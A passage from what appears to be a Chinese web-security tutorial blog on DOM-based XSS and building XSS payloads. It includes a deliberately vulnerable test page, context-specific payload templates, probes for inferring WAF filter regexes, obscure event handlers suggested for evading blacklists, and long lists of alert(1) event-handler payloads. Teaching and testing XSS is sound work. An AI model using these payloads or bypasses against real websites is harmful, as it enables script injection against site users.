<p>因为有些情况DOM-XSS的Payload，可以通过<code>location.hash</code>，即设置为锚部分从<code>#</code>之后的部分，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免waf检测。<code>location.search</code>也类似，它可以把部分参数放在<code>?</code>之后的部分。</p>
</li>
<li><p><strong>长度不限</strong></p>
<p>这个很重要，关键时候，长度不够，可不是什么小药丸就解决的。</p>
</li>
<li><p><strong>隐蔽性强</strong></p>
<p>攻击代码可以具有隐蔽性，持久性。例如使用Cookie和localStorage作为攻击点的DOM-XSS，非常难以察觉，且持续的时间长。</p>
</li>
</ul>
<p>DOM型XSS测试代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.getElementById(<span class="string">&quot;t&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="javascript">		&#125;</span></span><br><span class="line"><span class="javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击<code>write</code>按钮后，会在当前页面插入一个超链接，其地址为文本框的内容：</p>
<p><img src="https://i.loli.net/2021/11/05/GTvHVmjBw4F9ARO.png" alt="image-20211105214151523"></p>
<p>在这里，<code>write</code>按钮的onclick事件调用了test()函数。而在test()函数中，修改了页面中的DOM节点，通过innerHTML把一段用户数据当做HTML写入到了页面中，这就造成了DOM-XSS。</p>
<p>构造如下数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(1) //</span><br></pre></td></tr></table></figure>
<p>输入后，页面代码就变成了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> //&#x27; &gt;</span>testLink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//”注释掉第二个单引号。</p>
<p>点击这个新生成的链接，脚本被执行：</p>
<p><img src="https://i.loli.net/2021/11/05/1iMWnlGKCUAEosZ.png" alt="image-20211105214817378"></p>
<p>实际上，这里还有另一种利用方式——除了构造一个新事件外，还可以选择闭合掉<code>&lt;a&gt;</code>标签，并插入一个新的HTML标签。尝试如下输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=# onerror=alert(1) /&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>
<p>页面代码变成了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span>&lt;&#x27;&#x27; &gt;testLink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="XSS漏洞挖掘场景"><a href="#XSS漏洞挖掘场景" class="headerlink" title="XSS漏洞挖掘场景"></a>XSS漏洞挖掘场景</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
<ul>
<li>URL的每一个参数</li>
<li>URL本身</li>
<li>表单</li>
<li>搜索框</li>
</ul>
<h3 id="常见业务场景"><a href="#常见业务场景" class="headerlink" title="常见业务场景"></a>常见业务场景</h3><ul>
<li>重灾区：评论区、留言区、个人信息、订单信息等</li>
<li>针对型：站内信、网页即时通讯、私信、意见反馈</li>
<li>存在风险：搜索框、当前目录、图片属性等</li>
</ul>
<h3 id="白盒测试-代码审计"><a href="#白盒测试-代码审计" class="headerlink" title="白盒测试(代码审计)"></a>白盒测试(代码审计)</h3><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
<p>PHP中常见的接收参数的方式有 <code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code> 等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>
<p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
<p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
<li><a href="https://www.cnblogs.com/csnd/p/11807592.html">XSS(跨站脚本攻击)详解 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://owasp.org/Top10/">OWASP Top 10:2021</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS跨站脚本</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS Payload的构造</title>
    <url>/post/163a9d7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="浏览器的解析过程"><a href="#浏览器的解析过程" class="headerlink" title="浏览器的解析过程"></a>浏览器的解析过程</h2><ul>
<li>获取请求文档的内容后，呈现引擎将开始解析 HTML 文档，并将各标记逐个转化成“内容树”上的 DOM 节点。</li>
<li>解析外部 CSS以及style元素中的样式数据形成呈现树。呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。呈现树构建完毕之后，进入“布局”处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。</li>
<li>解析script标签时，解析完毕马上执行，并且阻塞页面。</li>
<li>绘制 - 呈现引擎会遍历呈现树，由用户界面后端层将每个节点绘制出来。</li>
</ul>
<p><img src="https://i.loli.net/2021/11/08/DghBTGwmWoEQ8de.png" alt="image-20211108145033378"></p>
<h2 id="HTML-解析器五类元素"><a href="#HTML-解析器五类元素" class="headerlink" title="HTML 解析器五类元素"></a>HTML 解析器五类元素</h2><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素(Voidelements)，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>
<p>空元素： <code>&lt;area&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;col&gt;</code>、<code>&lt;command&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;hr&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;keygen&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;meta&gt;</code>、<code>&lt;param&gt;</code>、<code>&lt;source&gt;</code>、<code>&lt;track&gt;</code>、<code>&lt;br&gt;</code>。</p>
<h3 id="原始文本元素"><a href="#原始文本元素" class="headerlink" title="原始文本元素"></a>原始文本元素</h3><p>原始文本元素 (Raw textelements)，可以容纳文本。</p>
<p>原始文本元素：<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p>
<h3 id="RCDATA"><a href="#RCDATA" class="headerlink" title="RCDATA"></a>RCDATA</h3><p>RCDATA (RCDATA elements)元素，可以容纳文本和字符引用。</p>
<p>RCDATA 元素：<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p>
<h3 id="外部元素"><a href="#外部元素" class="headerlink" title="外部元素"></a>外部元素</h3><p>外部元素 (Foreignelements)，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>
<p>外部元素：例如 MathML 命名空间或者 SVG 命名空间的元素</p>
<h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><p>基本元素 (Normal elements)，可以容纳文本、字符引用、其他元素和注释</p>
<p>基本元素：除了以上 4 种元素以外的元素</p>
<h2 id="XSS-Payload结构"><a href="#XSS-Payload结构" class="headerlink" title="XSS Payload结构"></a>XSS Payload结构</h2><p>当我们挖掘反射型和存储型XSS漏洞时，有一个关键的任务是识别XSS context。包括以下信息：</p>
<ul>
<li>用户可控的数据出现在responses的位置</li>
<li>应用对输入执行的验证</li>
</ul>
<p>基于这些细节，然后可以选择合适的XSS Payload，并测试其有效性。</p>
<h3 id="基于HTML上下文"><a href="#基于HTML上下文" class="headerlink" title="基于HTML上下文"></a>基于HTML上下文</h3><p>当用户的输入数据映射在Web页面的HTML代码中时，这种场景就是我们所谓的HTML上下文。HTML上下文可以根据用户输入在代码中的映射位置来进一步划分成：</p>
<ul>
<li><p><strong>标签内</strong>：<code>&lt;input type=&quot;text&quot; value=&quot;$input&quot;&gt;</code></p>
<p>针对标签内，也就是标签属性的XSS，可以结束属性值，并闭合tag，然后，引入一个新的tag。例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p><strong>标签外</strong>：<code>&lt;span&gt;Youentered $input&lt;/span&gt;</code></p>
<p>针对标签外，也就是标签之间的XSS，可以闭合先前的tag，并引入新的tags来执行JavaScript。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Payload机制-1"><a href="#Payload机制-1" class="headerlink" title="Payload机制-1"></a>Payload机制-1</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;&#123;tag&#125;&#123;filler&#125;&#123;event_handler&#125;&#123;?filler&#125;=&#123;?filler&#125;&#123;javascript&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
<p>找到{tag}的合适值之后，就需要猜测用于匹配标签和事件处理器间数据过滤器的正则表达式了。这一步可以使用下面的探测机制来实现：</p>
<ul>
<li>&lt;tag xxx - 如果无法通过，则为{space}；</li>
<li>&lt;tag%09xxx - 如果无法通过，则为[\s]；</li>
<li>&lt;tag%09%09xxx - 如果无法通过，则为\s+；</li>
<li>&lt;tag/xxx - 如果无法通过，则为[\s/]+；</li>
<li>&lt;tag%0axxx- 如果无法通过，则为[\s\n]+；</li>
<li><tag%0dxxx>- 如果无法通过，则为[\s\n\r+]+；</tag%0dxxx></li>
<li>&lt;tag/~/xxx - 如果无法通过，则为.*+；</li>
</ul>
<p>这个组件（例如事件处理器）是Payload结构中最关键的部分。通常，匹配它的是常规正则表达式（例如“on\w+”）或黑名单（例如“on(load|click|error|show)”）。第一个正则表达式非常严格，很难绕过，而基于黑名单的模式可以通过不常用的事件处理器来绕过。安全机制的实现类型可以通过下面两种简单的方法来识别：</p>
<ul>
<li>&lt;tag{filler}onxxx - 如果无法通过，则为on\w+。如果通过，则为on(load|click|error|show)；</li>
<li>&lt;tag{filler}onclick- 如果通过，则表明没有事件处理器检测正则表达式；</li>
</ul>
<p>下面是一些冷门的事件处理器，可能防火墙黑名单中没标记：</p>
<ul>
<li>onauxclick</li>
<li>ondblclick</li>
<li>oncontextmenu</li>
<li>onmouseleave</li>
<li>ontouchcancel</li>
</ul>
<p>常用的Payload结束符如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">payload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">payload</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>&#123;<span class="attr">space</span>&#125;</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>//</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">0a</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">0d</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">payload</span>%<span class="attr">09</span></span></span><br></pre></td></tr></table></figure>
<p>其中的{filler}为绕过过滤器的分隔符，常见的{filler}如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3B</span><br><span class="line">Chrome: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line">Safari: 0x2C, 0x3B</span><br><span class="line">FireFox: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line">Opera: 0x09, 0x20, 0x2C, 0x3B</span><br><span class="line">Android: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br></pre></td></tr></table></figure>
<h4 id="Payload机制-2"><a href="#Payload机制-2" class="headerlink" title="Payload机制-2"></a>Payload机制-2</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;sCriPt&#123;filler&#125;sRc&#123;?filler&#125;=&#123;?filler&#125;&#123;url&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
<p>使用了<code>&lt;object&gt;</code>标签的Payload可以利用下面的Payload机制来构建：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;obJecT&#123;filler&#125;data&#123;?filler&#125;=&#123;?filler&#125;&#123;url&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Payload机制-3"><a href="#Payload机制-3" class="headerlink" title="Payload机制-3"></a>Payload机制-3</h4><p>这种Payload机制有两种形式：明文或混淆处理。</p>
<p>明文结构如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;A&#123;filler&#125;hReF&#123;?filler&#125;=&#123;?filler&#125;JavaScript:&#123;javascript&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
<p>混淆处理后的Payload结构如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;A&#123;filler&#125;hReF&#123;?filler&#125;=&#123;?filler&#125;&#123;quote&#125;&#123;special&#125;:&#123;javascript&#125;&#123;quote&#125;&#123;?filler&#125;&#123;&gt;,//,Space,Tab,LF&#125;</span><br></pre></td></tr></table></figure>
<h3 id="基于JavaScript上下文"><a href="#基于JavaScript上下文" class="headerlink" title="基于JavaScript上下文"></a>基于JavaScript上下文</h3><p>当XSS上下文是响应中的一些现有JavaScript时，可能会出现各种各样的情况，需要使用不同的技术来执行成功的利用。例如下面这个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">...</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> input = <span class="string">&#x27;controllable data here&#x27;</span>;</span></span><br><span class="line"><span class="javascript">...</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>基于JavaScript上下文的Payload结构也分可两种方法：</p>
<ul>
<li><strong>闭合当前script标签</strong></li>
</ul>
<p>关闭现存的script在最简单的情况下，可以简单地关闭包围现有JavaScript的脚本标记，并引入一些新的HTML标记，用于触发JavaScript。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种XSS payload构造机制可参考基于HTML上下文。</p>
<ul>
<li><strong>跳出当前JavaScript字符串</strong></li>
</ul>
<p>当XSS context位于带引号的字符串中的情况下，通常可以中断字符串，并直接执行JavaScript。必须在XSS context之后修复脚本，因为，那里的任何语法错误都将阻止整个脚本的执行。下面是一些常用的方式：</p>
<h4 id="Payload机制-1-1"><a href="#Payload机制-1-1" class="headerlink" title="Payload机制-1"></a>Payload机制-1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;quote&#125;&#123;delimiter&#125;&#123;javascript&#125;&#123;delimiter&#125;&#123;quote&#125;</span><br></pre></td></tr></table></figure>
<p>可用的Payload有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;^&#123;javascript&#125;^&#x27;</span><br><span class="line">&#x27;*&#123;javascript&#125;*&#x27;</span><br><span class="line">&#x27;+&#123;javascript&#125;+&#x27;</span><br><span class="line">&#x27;/&#123;javascript&#125;/&#x27;</span><br><span class="line">&#x27;%&#123;javascript&#125;%&#x27;</span><br><span class="line">&#x27;|&#123;javascript&#125;|&#x27;</span><br><span class="line">&#x27;&lt;&#123;javascript&#125;&lt;&#x27;</span><br><span class="line">&#x27;&gt;&#123;javascript&#125;&gt;&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="Payload机制-2-1"><a href="#Payload机制-2-1" class="headerlink" title="Payload机制-2"></a>Payload机制-2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;quote&#125;&#123;delimiter&#125;&#123;javascript&#125;//</span><br></pre></td></tr></table></figure>
<p>可以使用下列Payload机制来构建Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;&#123;javascript&#125;//&#x27;</span><br><span class="line">&#x27;|&#123;javascript&#125;//&#x27;</span><br><span class="line">&#x27;^&#123;javascript&#125;//&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="基于JavaScript事件的XSS"><a href="#基于JavaScript事件的XSS" class="headerlink" title="基于JavaScript事件的XSS"></a>基于JavaScript事件的XSS</h2><h3 id="标准HTML事件"><a href="#标准HTML事件" class="headerlink" title="标准HTML事件"></a>标准HTML事件</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">事件名称</th>
<th style="text-align:center">标签</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">onload</td>
<td style="text-align:center">body, iframe, img, frameset, input, script, style, link, svg</td>
<td style="text-align:center">适用于0-click，但通常会被过滤掉</td>
</tr>
<tr>
<td style="text-align:center">onpageshow</td>
<td style="text-align:center">body</td>
<td style="text-align:center">适用于 0-click，但只能用在非DOM注入中</td>
</tr>
<tr>
<td style="text-align:center">onfocus</td>
<td style="text-align:center">大多数标签</td>
<td style="text-align:center">适用于 0-click：配合<code>autofocus</code>使用</td>
</tr>
<tr>
<td style="text-align:center">onmouseover</td>
<td style="text-align:center">大多数标签</td>
<td style="text-align:center">如果可能的话，添加参数值来让其尽可能的大。</td>
</tr>
<tr>
<td style="text-align:center">onerror</td>
<td style="text-align:center">img, input, object, link, script, video, audio</td>
<td style="text-align:center">确保传递参数来终止运行</td>
</tr>
<tr>
<td style="text-align:center">onanimationstart</td>
<td style="text-align:center">与任何可以设置动画的元素组合</td>
<td style="text-align:center">启动，然后开始CSS动画</td>
</tr>
<tr>
<td style="text-align:center">onanimationend</td>
<td style="text-align:center">与任何可以设置动画的元素组合</td>
<td style="text-align:center">启动，然后结束CSS动画</td>
</tr>
<tr>
<td style="text-align:center">onstart</td>
<td style="text-align:center">marquee</td>
<td style="text-align:center">在字幕动画启动时启动-仅限Firefox</td>
</tr>
<tr>
<td style="text-align:center">onfinish</td>
<td style="text-align:center">marquee</td>
<td style="text-align:center">在字幕动画结束时启动-仅限Firefox</td>
</tr>
<tr>
<td style="text-align:center">ontoggle</td>
<td style="text-align:center">details</td>
<td style="text-align:center">必须提供<code>open</code>参数以支持0-click</td>
</tr>
</tbody>
</table>
</div>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;svg onload=alert(1);&gt;&quot;</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:1000px;height:1000px&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">10</span> <span class="attr">loop</span>=<span class="string">2</span> <span class="attr">behavior</span>=<span class="string">&quot;alternate&quot;</span> <span class="attr">onbounce</span>=<span class="string">alert(1)</span>&gt;</span> (firefox only)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span> <span class="comment">&lt;!-- firefox only --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span> <span class="comment">&lt;!-- firefox only --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="HTML5事件"><a href="#HTML5事件" class="headerlink" title="HTML5事件"></a>HTML5事件</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">事件名称</th>
<th style="text-align:center">标签</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">onplay</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">onplaying</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">oncanplay</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">必须链接有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">onloadeddata</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">必须链接有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">onloadedmetadata</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">必须链接有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">onprogress</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">必须链接有效的视频/音频</td>
</tr>
<tr>
<td style="text-align:center">onloadstart</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">潜在的0-click向量</td>
</tr>
<tr>
<td style="text-align:center">oncanplay</td>
<td style="text-align:center">video, audio</td>
<td style="text-align:center">必须链接有效的视频/音频</td>
</tr>
</tbody>
</table>
</div>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadeddata</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadedmetadata</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">oncanplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span 